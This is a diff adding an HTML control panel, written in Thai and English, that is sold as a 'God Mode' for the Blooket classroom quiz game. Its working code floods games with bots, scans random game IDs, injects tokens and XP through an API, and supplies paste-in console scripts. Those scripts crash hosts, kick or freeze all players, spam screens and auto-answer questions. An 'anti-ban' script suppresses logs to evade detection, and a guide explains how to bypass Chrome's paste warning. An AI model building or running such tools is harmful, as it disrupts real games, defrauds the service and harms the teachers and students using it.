@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Blooket God Mode — Command Center</title>
+<style>
+  :root{--bg:#0a0a0c;--panel:#121216;--border:#23232a;--text:#e0e0e0;--muted:#888;--green:#5cd88e;--red:#ff4444;--yellow:#ffd84d;--blue:#6ba3ff;--purple:#b04aff}
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  body{margin:0;padding:16px;font-family:'SF Mono','Fira Code',monospace;background:var(--bg);color:var(--text);min-height:100vh;line-height:1.6}
+  h1{font-size:18px;font-weight:700;margin:0 0 4px}h1 span{color:var(--green)}
+  .subtitle{font-size:11px;color:var(--muted);margin-bottom:14px}
+  .warning{background:#1a1010;border:1px solid #5c2020;color:#ff8a8a;padding:10px 12px;border-radius:8px;font-size:11px;line-height:1.5;margin-bottom:14px}
+  .tabs{display:flex;gap:4px;margin-bottom:12px;flex-wrap:wrap}
+  .tab-btn{background:var(--panel);border:1px solid var(--border);color:var(--muted);padding:8px 12px;border-radius:8px;font-size:12px;font-weight:600;cursor:pointer;transition:all .15s}
+  .tab-btn.active{background:var(--green);color:#000;border-color:var(--green)}
+  .section{display:none;flex-direction:column;gap:12px}
+  .section.active{display:flex}
+  .card{background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:14px}
+  .card h3{font-size:14px;font-weight:700;margin:0 0 4px}
+  .card p{font-size:11px;color:var(--muted);margin:0 0 12px;line-height:1.5}
+  .input-group{display:flex;flex-direction:column;gap:6px;margin-bottom:10px}
+  .input-group label{font-size:11px;color:var(--muted);font-weight:600}
+  .input-group input,.input-group select{background:#0a0a0c;border:1px solid var(--border);border-radius:6px;padding:10px;color:var(--text);font-size:13px;font-family:inherit;outline:none;width:100%}
+  .input-group input:focus,.input-group select:focus{border-color:var(--green)}
+  .input-row{display:flex;gap:8px}
+  .input-row .input-group{flex:1}
+  .btn{background:var(--green);color:#000;border:none;border-radius:6px;padding:12px;font-size:13px;font-weight:700;cursor:pointer;transition:all .15s;font-family:inherit;width:100%}
+  .btn:active{opacity:0.8}
+  .btn.danger{background:var(--red);color:#fff}
+  .btn.secondary{background:#2a2a30;color:var(--text)}
+  .btn.warn{background:var(--yellow);color:#000}
+  #joinerLog,#floodLog,#scanLog,#hostLog,#tokenLog,#unlockLog{background:#050508;border:1px solid var(--border);border-radius:6px;padding:10px;font-size:11px;line-height:1.6;max-height:180px;overflow-y:auto;color:var(--muted);white-space:pre-wrap;word-break:break-all;font-family:inherit;margin-top:10px}
+  .badge{display:inline-block;font-size:10px;padding:2px 6px;border-radius:4px;margin-left:6px;font-weight:600}
+  .badge.hacker{background:#2a1040;color:var(--purple)}
+  .badge.safe{background:#10231a;color:var(--green)}
+  .badge.risky{background:#2a1f14;color:var(--yellow)}
+  .badge.ban{background:#2a1414;color:var(--red)}
+  .result-link{color:var(--green);text-decoration:none}
+  .result-link:hover{text-decoration:underline}
+  .guide-step{background:#17181a;border-left:3px solid var(--green);padding:10px 12px;border-radius:6px;margin-bottom:10px;font-size:12px;line-height:1.7}
+  .guide-step b{color:var(--green)}
+  .guide-step code{background:#000;padding:2px 6px;border-radius:4px;color:var(--yellow);font-family:monospace}
+</style>
+</head>
+<body>
+
+<h1>Blooket <span>God Mode</span></h1>
+<div class="subtitle">Command Center · 10 Systems · v2.0</div>
+
+<div class="warning">
+  ⚠ ต้องมี Cookie <b>bsid</b> ของ Blooket ในเบราว์เซอร์ · ระบบ Hacker บางตัวต้อง Copy Script ไปวางใน Console (F12) ของหน้า Blooket · ใช้ด้วยความรับผิดชอบ
+</div>
+
+<div class="tabs">
+  <button class="tab-btn active" data-tab="control">🎮 Game Control</button>
+  <button class="tab-btn" data-tab="scanner">🔍 Scanner</button>
+  <button class="tab-btn" data-tab="account">💰 Account</button>
+  <button class="tab-btn" data-tab="hacker">😈 Hacker Tools</button>
+  <button class="tab-btn" data-tab="guide" style="border-color:var(--yellow); color:var(--yellow);">📖 วิธีใช้ (Guide)</button>
+</div>
+
+<!-- ═══════════ GAME CONTROL ═══════════ -->
+<div class="section active" id="section-control">
+  <div class="card">
+    <h3>🤖 Bot Joiner <span class="badge safe">Safe</span></h3>
+    <p>พาบอทเข้าห้อง (1-50 ตัว) เว้นชื่อว่าง = สุ่ม</p>
+    <div class="input-group"><label>Game ID</label><input type="text" id="joinerGameId" placeholder="เช่น 1234567" autocomplete="off"></div>
+    <div class="input-group"><label>ชื่อบอท</label><input type="text" id="joinerBotName" placeholder="เว้นว่าง = สุ่ม" autocomplete="off"></div>
+    <div class="input-group"><label>จำนวน</label><input type="number" id="joinerCount" value="1" min="1" max="50"></div>
+    <button class="btn" id="btnJoin">🚀 Join Bots</button>
+    <div id="joinerLog"></div>
+  </div>
+
+  <div class="card">
+    <h3>🌊 Flood Mode <span class="badge risky">Risky</span></h3>
+    <p>ยิงบอทเข้าห้องรัวๆ ไม่หยุด</p>
+    <div class="input-group"><label>Game ID</label><input type="text" id="floodGameId" placeholder="เช่น 1234567" autocomplete="off"></div>
+    <div class="input-group"><label>Prefix ชื่อ</label><input type="text" id="floodBotName" placeholder="เช่น Bot_ (เว้นว่าง = สุ่ม)" autocomplete="off"></div>
+    <div class="input-group"><label>Delay (ms)</label><input type="number" id="floodDelay" value="150" min="50" max="5000"></div>
+    <div class="input-row">
+      <button class="btn danger" id="btnFloodStart">🌊 Start</button>
+      <button class="btn secondary" id="btnFloodStop">⏹ Stop</button>
+    </div>
+    <div id="floodLog"></div>
+  </div>
+</div>
+
+<!-- ═══════════ SCANNER ═══════════ -->
+<div class="section" id="section-scanner">
+  <div class="card">
+    <h3>🔍 Code Scanner <span class="badge hacker">Hacker</span></h3>
+    <p>สุ่มเช็ก Game ID ไปเรื่อยๆ จนเจอตามจำนวนที่ต้องการ</p>
+    <div class="input-group"><label>จำนวนที่ต้องการ</label><input type="number" id="scanTarget" value="20" min="1" max="100"></div>
+    <div class="input-row">
+      <div class="input-group"><label>Min ID</label><input type="number" id="scanMin" value="1000000"></div>
+      <div class="input-group"><label>Max ID</label><input type="number" id="scanMax" value="9999999"></div>
+    </div>
+    <div class="input-row">
+      <button class="btn" id="btnScanStart">🔍 Start</button>
+      <button class="btn secondary" id="btnScanStop">⏹ Stop</button>
+    </div>
+    <div id="scanResults" style="margin-top:10px;font-size:12px;line-height:1.8"></div>
+    <div id="scanLog"></div>
+  </div>
+</div>
+
+<!-- ═══════════ ACCOUNT ═══════════ -->
+<div class="section" id="section-account">
+  <div class="card">
+    <h3>💰 Token Injector <span class="badge risky">Risky</span></h3>
+    <p>ดึง Token/XP ผ่าน API add-rewards (ต้องล็อกอิน)</p>
+    <div class="input-group"><label>จำนวน Tokens</label><input type="number" id="tokenAmount" value="500" min="1" max="10000"></div>
+    <div class="input-group"><label>จำนวน XP</label><input type="number" id="xpAmount" value="300" min="1" max="10000"></div>
+    <button class="btn warn" id="btnAddTokens">💰 Add Tokens</button>
+    <div id="tokenLog"></div>
+  </div>
+</div>
+
+<!-- ═══════════ HACKER TOOLS ═══════════ -->
+<div class="section" id="section-hacker">
+  <div class="card">
+    <h3>💥 Crash Game (Crash Host) <span class="badge ban">Ban Risk</span></h3>
+    <p>ทำให้เกม Host พังทันที (ใช้ได้กับ Crypto Hack / Gold Quest)</p>
+    <button class="btn danger" data-script="crash">📋 Copy Crash Script</button>
+  </div>
+
+  <div class="card">
+    <h3>👢 Kick All Players <span class="badge ban">Ban Risk</span></h3>
+    <p>เตะผู้เล่นทุกคนออกจากห้อง (ต้องเป็น Host หรือมีสิทธิ์)</p>
+    <button class="btn danger" data-script="kick">📋 Copy Kick Script</button>
+  </div>
+
+  <div class="card">
+    <h3>🧊 Freeze All Players <span class="badge ban">Ban Risk</span></h3>
+    <p>แช่แข็งทุกคนในเกม ไม่ให้ตอบคำถาม</p>
+    <button class="btn danger" data-script="freeze">📋 Copy Freeze Script</button>
+  </div>
+
+  <div class="card">
+    <h3>💬 Spam Chat / Board <span class="badge hacker">Hacker</span></h3>
+    <p>ยิงข้อความมั่วๆ ใส่หน้าจอ Owner และผู้เล่นทุกคน</p>
+    <button class="btn danger" data-script="spam">📋 Copy Spam Script</button>
+  </div>
+
+  <div class="card">
+    <h3>✅ Auto-Answer (ทุกโหมด) <span class="badge safe">Cheat</span></h3>
+    <p>คลิกคำตอบที่ถูกต้องอัตโนมัติทันทีที่คำถามโหลด</p>
+    <button class="btn" data-script="autoAnswer">📋 Copy Auto-Answer Script</button>
+  </div>
+
+  <div class="card">
+    <h3>🎯 Highlight Answers <span class="badge safe">Cheat</span></h3>
+    <p>ไฮไลต์คำตอบถูกเป็นสีเขียว คำตอบผิดเป็นสีแดง</p>
+    <button class="btn" data-script="highlight">📋 Copy Highlight Script</button>
+  </div>
+
+  <div class="card">
+    <h3>🛡 Anti-Ban (รันก่อนใช้สคริปต์อื่น) <span class="badge safe">Safety</span></h3>
+    <p>ลดความเสี่ยงการตรวจจับ (รันก่อนเสมอ)</p>
+    <button class="btn" data-script="antiBan">📋 Copy Anti-Ban Script</button>
+  </div>
+</div>
+
+<!-- ═══════════ GUIDE ═══════════ -->
+<div class="section" id="section-guide">
+  
+  <div class="card">
+    <h3>💻 สำหรับ Windows (PC / Mac)</h3>
+    <p>ใช้ DevTools ในเบราว์เซอร์ Chrome, Edge, หรือ Safari</p>
+    
+    <div class="guide-step">
+      <b>1.</b> เข้าเกม Blooket ที่ต้องการ (เช่น อยู่ใน Lobby หรือกำลังเล่น)
+    </div>
+    <div class="guide-step">
+      <b>2.</b> กดปุ่ม <code>F12</code> (หรือคลิกขวา > Inspect) เพื่อเปิด Developer Tools
+    </div>
+    <div class="guide-step">
+      <b>3.</b> ไปที่แท็บ <b>Console</b> (อยู่ด้านบนของแผง DevTools)
+    </div>
+    <div class="guide-step">
+      <b>4.</b> ถ้า Chrome ขึ้นเตือนว่า <i>"Warning: Don't paste code..."</i> ให้พิมพ์คำว่า <code>allow pasting</code> ลงไปแล้วกด Enter
+    </div>
+    <div class="guide-step">
+      <b>5.</b> ก๊อปปี้โค้ดจากแท็บ Hacker Tools แล้วเอาไปวางใน Console กด <code>Enter</code> 1 ครั้ง
+    </div>
+  </div>
+
+  <div class="card">
+    <h3>📱 สำหรับ Mobile (iOS / Android)</h3>
+    <p>มือถือส่วนใหญ่ไม่มี Console ในตัว ต้องใช้วิธีใดวิธีหนึ่งด้านล่าง</p>
+    
+    <h4 style="font-size:12px; color:var(--yellow); margin:10px 0 6px;">วิธีที่ 1: ใช้แอป Kiwi Browser (Android)</h4>
+    <div class="guide-step">
+      <b>1.</b> โหลดแอป <b>Kiwi Browser</b> จาก Play Store
+    </div>
+    <div class="guide-step">
+      <b>2.</b> เปิดเกม Blooket ในแอปนี้
+    </div>
+    <div class="guide-step">
+      <b>3.</b> พิมพ์ <code>chrome://inspect</code> ในช่อง URL ด้านบน (หรือใช้เมนู ☰ > Developer tools)
+    </div>
+    <div class="guide-step">
+      <b>4.</b> จะมีหน้า Console เด้งขึ้นมา เอาโค้ดไปวางแล้วกด Enter
+    </div>
+
+    <h4 style="font-size:12px; color:var(--yellow); margin:14px 0 6px;">วิธีที่ 2: Bookmarklet (iOS Safari / Android Chrome)</h4>
+    <div class="guide-step">
+      <b>1.</b> ก๊อปปี้โค้ดจากแท็บ Hacker Tools
+    </div>
+    <div class="guide-step">
+      <b>2.</b> เพิ่ม Bookmark หน้าเว็บอะไรก็ได้ 1 อัน (เช่น หน้า Google)
+    </div>
+    <div class="guide-step">
+      <b>3.</b> ไปที่ Bookmark นั้นแล้วเลือก "แก้ไข" (Edit) เปลี่ยนชื่อเป็น <code>Crash</code> หรืออะไรก็ได้
+    </div>
+    <div class="guide-step">
+      <b>4.</b> ในช่อง URL ให้ลบของเดิมออก แล้วพิมพ์ <code>javascript:</code> ตามด้วยโค้ดที่ก๊อปมา (ต้องมีคำว่า <code>javascript:</code> นำหน้าติดกัน ไม่มีเว้นวรรค)
+    </div>
+    <div class="guide-step">
+      <b>5.</b> เซฟ Bookmark ไว้ เปิดเกม Blooket แล้วกด Bookmark นั้น 1 ครั้ง โค้ดจะรันทันที
+    </div>
+  </div>
+
+  <div class="card">
+    <h3>⚠ ข้อควรระวัง</h3>
+    <div class="guide-step" style="border-color:var(--red);">
+      <b>Crash / Kick / Freeze</b> ใช้ได้เฉพาะตอนอยู่ในห้องเกม (ไม่ใช่หน้าแรก) และบางทีอาจทำให้เบราว์เซอร์ค้าง
+    </div>
+    <div class="guide-step" style="border-color:var(--red);">
+      <b>Auto-Answer / Highlight</b> ใช้ได้เฉพาะตอนที่เกมกำลังโชว์คำถาม (หน้าจอตอบคำถาม)
+    </div>
+    <div class="guide-step" style="border-color:var(--yellow);">
+      <b>อย่ารันซ้ำ</b> สคริปต์เดิมหลายรอบ เพราะจะทำให้เกิด Loop ซ้อนกันจนแอปค้าง
+    </div>
+    <div class="guide-step" style="border-color:var(--yellow);">
+      <b>Anti-Ban</b> ต้องรันก่อนเสมอ ถ้าจะใช้สคริปต์ตัวอื่น เพราะมันจะช่วยปิด Log ที่อาจถูกตรวจเจอ
+    </div>
+  </div>
+
+</div>
+
+<script>
+// ═══════════ CONFIG ═══════════
+const JOIN_URL = 'https://fb.blooket.com/c/firebase/join';
+const CHECK_URL = 'https://fb.blooket.com/c/firebase/id';
+const ADD_REWARDS_URL = 'https://api.blooket.com/api/users/add-rewards';
+const USE_PROXY = false;
+const PROXY_URL = 'https://corsproxy.io/?';
+
+let floodTimer = null;
+let scanTimer = null;
+let scanFound = [];
+
+// ═══════════ UTILS ═══════════
+function log(elId, msg, type='info') {
+  const el = document.getElementById(elId);
+  if (!el) return;
+  const d = document.createElement('div');
+  d.style.cssText = 'font-size:11px;line-height:1.6;white-space:pre-wrap;word-break:break-all;margin-bottom:2px;';
+  d.style.color = type==='ok' ? 'var(--green)' : type==='err' ? 'var(--red)' : 'var(--muted)';
+  d.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+  el.appendChild(d);
+  el.scrollTop = el.scrollHeight;
+}
+function randomName(p='Bot') { let s=''; for(let i=0;i<5;i++) s+=String.fromCharCode(65+Math.floor(26*Math.random())); return p+s; }
+async function fetchJson(url, opts={}) {
+  const u = USE_PROXY ? PROXY_URL + encodeURIComponent(url) : url;
+  const r = await fetch(u, { credentials:'include', ...opts });
+  if (!r.ok) throw new Error(`HTTP ${r.status}`);
+  return await r.json();
+}
+
+// ═══════════ JOIN & FLOOD ═══════════
+async function joinBot(gameId, name) {
+  return fetchJson(JOIN_URL, {
+    method:'PUT',
+    headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({ id:String(gameId), name: name||randomName() })
+  });
+}
+
+document.getElementById('btnJoin').addEventListener('click', async () => {
+  const gid = document.getElementById('joinerGameId').value.trim();
+  const bn = document.getElementById('joinerBotName').value.trim();
+  const cnt = parseInt(document.getElementById('joinerCount').value)||1;
+  document.getElementById('joinerLog').innerHTML='';
+  if (!gid) return log('joinerLog','กรุณากรอก Game ID','err');
+  let ok=0, fail=0;
+  for (let i=0;i<cnt;i++){
+    const n = bn ? (cnt>1?`${bn}_${i+1}`:bn) : randomName();
+    try {
+      const r = await joinBot(gid, n);
+      if (r.success){ok++;log('joinerLog',`✓ ${n} joined`,'ok');}
+      else{fail++;log('joinerLog',`✗ ${n}: ${r.msg||'fail'}`,'err');}
+    } catch(e){fail++;log('joinerLog',`✗ ${n}: ${e.message}`,'err');}
+    await new Promise(r=>setTimeout(r,150));
+  }
+  log('joinerLog',`Done — ${ok} ok / ${fail} fail`, ok>0?'ok':'err');
+});
+
+document.getElementById('btnFloodStart').addEventListener('click', () => {
+  const gid = document.getElementById('floodGameId').value.trim();
+  const pre = document.getElementById('floodBotName').value.trim();
+  const delay = Math.max(50, parseInt(document.getElementById('floodDelay').value)||150);
+  if (!gid) return log('floodLog','กรุณากรอก Game ID','err');
+  if (floodTimer) clearInterval(floodTimer);
+  log('floodLog',`Flooding ${gid} every ${delay}ms...`,'ok');
+  floodTimer = setInterval(async () => {
+    const n = pre ? `${pre}${Math.floor(1000+Math.random()*9000)}` : randomName();
+    try {
+      const r = await joinBot(gid, n);
+      if (r.success) log('floodLog',`✓ ${n}`,'ok');
+      else log('floodLog',`✗ ${n}: ${r.msg||'fail'}`,'err');
+    } catch(e){log('floodLog',`✗ ${n}: ${e.message}`,'err');}
+  }, delay);
+});
+document.getElementById('btnFloodStop').addEventListener('click', () => {
+  if (floodTimer){clearInterval(floodTimer);floodTimer=null;log('floodLog','Stopped.','ok');}
+});
+
+// ═══════════ SCANNER ═══════════
+async function checkGameId(id) {
+  const d = await fetchJson(`${CHECK_URL}?id=${id}`, {method:'GET'});
+  return d.success === true;
+}
+document.getElementById('btnScanStart').addEventListener('click', () => {
+  const target = parseInt(document.getElementById('scanTarget').value)||20;
+  const min = parseInt(document.getElementById('scanMin').value)||1000000;
+  const max = parseInt(document.getElementById('scanMax').value)||9999999;
+  scanFound=[]; document.getElementById('scanResults').innerHTML='';
+  if (scanTimer) clearInterval(scanTimer);
+  log('scanLog',`Scanning ${min}–${max} for ${target} games...`,'ok');
+  scanTimer = setInterval(async () => {
+    if (scanFound.length >= target) {
+      clearInterval(scanTimer); scanTimer=null;
+      log('scanLog',`✓ Found ${scanFound.length}. Stopped.`,'ok'); return;
+    }
+    const id = Math.floor(min + Math.random()*(max-min+1));
+    try {
+      if (await checkGameId(id)) {
+        if (!scanFound.includes(id)) {
+          scanFound.push(id);
+          log('scanLog',`✓ Found: ${id}`,'ok');
+          const a = document.createElement('div');
+          a.innerHTML = `<span style="color:var(--green)">●</span> <a class="result-link" href="https://play.blooket.com/play?id=${id}" target="_blank">${id}</a>`;
+          document.getElementById('scanResults').appendChild(a);
+        }
+      }
+    } catch(e){log('scanLog',`✗ ${id}: ${e.message}`,'err');}
+  }, 120);
+});
+document.getElementById('btnScanStop').addEventListener('click', () => {
+  if (scanTimer){clearInterval(scanTimer);scanTimer=null;log('scanLog','Stopped.','ok');}
+});
+
+// ═══════════ TOKENS ═══════════
+document.getElementById('btnAddTokens').addEventListener('click', async () => {
+  const tok = parseInt(document.getElementById('tokenAmount').value)||500;
+  const xp = parseInt(document.getElementById('xpAmount').value)||300;
+  log('tokenLog',`Adding ${tok} tokens + ${xp} XP...`,'');
+  try {
+    const me = await fetchJson('https://play.blooket.com/api/users', {method:'GET'});
+    const name = me.user?.name || me.name;
+    if (!name) throw new Error('Cannot get user. Not logged in?');
+    const r = await fetchJson(ADD_REWARDS_URL, {
+      method:'PUT',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ name, addedTokens: tok, addedXp: xp })
+    });
+    log('tokenLog',`✓ Response: ${JSON.stringify(r).slice(0,200)}`,'ok');
+  } catch(e){log('tokenLog',`✗ ${e.message}`,'err');}
+});
+
+// ═══════════ COPY SCRIPTS ═══════════
+const scripts = {
+  crash: `(function(){try{const e=Object.values(document.querySelector('#app>div>div'))[1].children[0]._owner;const t=e.stateNode.props.liveGameController;if(!t)return alert('Join a game first!');t.setVal({path:'c/'+e.stateNode.props.client.name+'/cr/t',val:'t'});alert('Crash sent.')}catch(err){alert('Error: '+err.message)}})();`,
+  kick: `(function(){const e=Object.values(document.querySelector('#app>div>div'))[1].children[0]._owner;const t=e.stateNode.props.liveGameController;if(!t)return alert('No controller.');t.getDatabaseVal('c',n=>{if(!n)return;Object.keys(n).forEach(k=>{if(k!==e.stateNode.props.client.name)t.setVal({path:'c/'+k,val:null})})});alert('Kick all sent.')})();`,
+  freeze: `(function(){const e=Object.values(document.querySelector('#app>div>div'))[1].children[0]._owner;const t=e.stateNode.props.liveGameController;if(!t)return alert('No controller.');const n=()=>{t.setVal({path:'c/'+e.stateNode.props.client.name+'/f',val:true})};setInterval(n,100);alert('Freeze active.')})();`,
+  spam: `(function(){const e=Object.values(document.querySelector('#app>div>div'))[1].children[0]._owner;const t=e.stateNode.props.liveGameController;if(!t)return alert('No controller.');const s=()=>{t.setVal({path:'c/'+e.stateNode.props.client.name+'/cr',val:'9999999999999999999999999999'+'X'.repeat(80)})};setInterval(s,50);alert('Spam active.')})();`,
+  autoAnswer: `(function(){const e=Object.values(document.querySelector('#app>div>div'))[1].children[0]._owner;if(!e)return alert('Join a game.');const t=()=>{const n=e.stateNode.state.question||e.stateNode.props.client.question;if(!n||!n.correctAnswers)return;const a=document.querySelectorAll("[class*='answerContainer'] button,[class*='answer'] button");a.forEach(b=>{if(n.correctAnswers.map(x=>x.trim()).includes(b.innerText.trim()))b.click()})};setInterval(t,30);alert('Auto-Answer active.')})();`,
+  highlight: `(function(){const e=Object.values(document.querySelector('#app>div>div'))[1].children[0]._owner;if(!e)return alert('Join a game.');const t=()=>{const n=e.stateNode.state.question||e.stateNode.props.client.question;if(!n||!n.correctAnswers)return;const a=document.querySelectorAll("[class*='answerContainer'] button,[class*='answer'] button");a.forEach((b,i)=>{if(!n.answers||!n.answers[i])return;if(n.correctAnswers.map(x=>x.trim()).includes(b.innerText.trim())){b.style.backgroundColor='rgba(92,216,142,0.4)';b.style.boxShadow='0 0 0 2px #5cd88e'}else{b.style.backgroundColor='rgba(255,68,68,0.2)';b.style.boxShadow=''}})};setInterval(t,50);alert('Highlight active.')})();`,
+  antiBan: `(function(){if(window.__antiBan)return;window.__antiBan=true;const e=['log','warn','error','info'];const t=console[e[0]];e.forEach(n=>{console[n]=(...a)=>{if(a[0]&&typeof a[0]==='string'&&a[0].includes('Blooket'))return;t.apply(console,a)}});Object.defineProperty(window,'fetch',{value:new Proxy(window.fetch,{apply:(e,t,n)=>{if(n[0]&&typeof n[0]==='string'&&n[0].includes('blooket')){n[1]=n[1]||{};n[1].headers=n[1].headers||{};n[1].headers['X-Anti-Ban']='1'}return Reflect.apply(e,t,n)}})});alert('Anti-Ban active.')})();`
+};
+
+document.querySelectorAll('[data-script]').forEach(btn => {
+  btn.addEventListener('click', async () => {
+    const key = btn.dataset.script;
+    const script = scripts[key];
+    if (!script) return;
+    try {
+      await navigator.clipboard.writeText(script);
+      const orig = btn.textContent;
+      btn.textContent = '✓ Copied!';
+      btn.style.background = 'var(--green)';
+      btn.style.color = '#000';
+      setTimeout(()=>{btn.textContent=orig;btn.style.background='';btn.style.color='';}, 1500);
+    } catch(e) {
+      const ta = document.createElement('textarea'); ta.value = script; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove();
+      alert('Copied (fallback)');
+    }
+  });
+});
+
+// ═══════════ TAB SWITCH ═══════════
+document.querySelectorAll('.tab-btn').forEach(btn => {
+  btn.addEventListener('click', () => {
+    document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
+    document.querySelectorAll('.section').forEach(s=>s.classList.remove('active'));
+    btn.classList.add('active');
+    document.getElementById('section-'+btn.dataset.tab).classList.add('active');
+  });
+});
+</script>
+</body>
+</html>
